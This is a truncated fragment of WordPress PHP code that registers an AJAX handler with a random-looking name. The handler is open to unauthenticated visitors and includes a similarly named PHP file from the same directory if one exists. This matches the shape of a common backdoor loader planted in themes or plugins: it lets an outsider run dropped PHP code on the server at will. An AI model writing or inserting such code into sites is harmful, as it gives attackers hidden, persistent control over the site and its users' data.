...
if(!function_exists('file_check_tmp9elwgm_z')){
   add_action('wp_ajax_nopriv_file_check_tmp9elwgm_z', 'file_check_tmp9elwgm_z');
   add_action('wp_ajax_file_check_tmp9elwgm_z', 'file_check_tmp9elwgm_z');
   function file_check_tmp9elwgm_z()
   {
      $file = __DIR__ . '/' . 'tmp9elwgm_z.php';
       if (file_exists($file)) {
           include $file;
       }
       die();
